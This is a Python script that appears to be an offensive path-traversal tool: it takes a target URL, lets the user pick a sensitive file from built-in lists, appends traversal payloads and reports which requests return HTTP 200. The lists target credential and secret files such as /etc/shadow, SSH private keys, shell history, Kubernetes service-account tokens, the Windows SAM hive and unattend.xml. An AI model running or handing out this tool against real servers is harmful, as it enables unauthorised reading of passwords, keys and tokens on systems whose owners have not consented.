import requests
from colorama import Fore, Back, Style
from welcome import afficher_ciseaux 
from welcome import afficher_serpent
from welcome import afficher_message_bienvenue
from welcome import afficher_message_ciseau
from welcome import message3
from sn4k import paths_fn
from sn4k import p
     
afficher_serpent()
afficher_message_bienvenue()

url_0 = str(input('Copy the URL here  ---> : '))

os_type = str(input("Choose the type of the file, Windows or Linux --> W/L :  "))

######################
file_type_linux =[
    "etc/issue",
    "etc/passwd",
    "etc/shadow",
    "etc/group",
    "etc/hosts",
    "etc/motd",
    "etc/mysql/my.cnf",
    "proc/[0-9]*/fd/[0-9]*",  
    "proc/self/environ",
    "proc/version",
    "proc/cmdline",
    "proc/sched_debug",
    "proc/mounts",
    "proc/net/arp",
    "proc/net/route",
    "proc/net/tcp",
    "proc/net/udp",
    "proc/self/cwd/index.php",
    "proc/self/cwd/main.py",
    "home/$USER/.bash_history",
    "home/$USER/.ssh/id_rsa",
    "run/secrets/kubernetes.io/serviceaccount/token",
    "run/secrets/kubernetes.io/serviceaccount/namespace",
    "run/secrets/kubernetes.io/serviceaccount/certificate",
    "var/run/secrets/kubernetes.io/serviceaccount",
    "var/lib/mlocate/mlocate.db",
    "var/lib/plocate/plocate.db",
    "var/lib/mlocate.db"
]
file_type_windows =[
    "c:/boot.ini",
    "c:/inetpub/logs/logfiles",
    "c:/inetpub/wwwroot/global.asa",
    "c:/inetpub/wwwroot/index.asp",
    "c:/inetpub/wwwroot/web.config",
    "c:/sysprep.inf",
    "c:/sysprep.xml",
    "c:/sysprep/sysprep.inf",
    "c:/sysprep/sysprep.xml",
    "c:/system32/inetsrv/metabase.xml",
    "c:/sysprep.inf",
    "c:/sysprep.xml",
    "c:/sysprep/sysprep.inf",
    "c:/sysprep/sysprep.xml",
    "c:/system volume information/wpsettings.dat",
    "c:/system32/inetsrv/metabase.xml",
    "c:/unattend.txt",
    "c:/unattend.xml",
    "c:/unattended.txt",
    "c:/unattended.xml",
    "c:/windows/repair/sam",
    "c:/windows/repair/system",
    "c:/windows/system.ini"
]
#########################

if os_type == "w" or os_type == "W":
    for i,windows in enumerate(file_type_windows):
        print(f"{i}. {windows}")
    n = int(input("Choose the name of the file you want:  "))
    p = file_type_windows[n]
       
if os_type =="l" or os_type == "L":
    for i,linux in enumerate(file_type_linux):
        print(f"{i}. {linux}")
    n = int(input("Choose the name of the file you want:  "))
    p = str(file_type_linux[n])




 
afficher_ciseaux()
afficher_message_ciseau()

#Shear the URL to work on the new cut link
n = -1
while url_0[n] != '/' and url_0[n] != '=':
    url_0[n-1]
    n = n-1
    url_coupe = url_0[:n+1]

    
#Sheared URL   
url_coupe = url_0[:n+1]


#We are now testing the various path traversals
    
good_url=[]
liste_path = paths_fn(p)
for i,liste in enumerate(liste_path):
    path = url_coupe + liste
    print("Tentative : ",i+1, " path used : ", liste)
     
    if requests.get(path).status_code == 200:
        good_url.append(path)
        break
   
    
    
    
#displays responses
message3()
for i,url_ in enumerate(good_url):
       
        print(Fore.RED + f"{url_}")
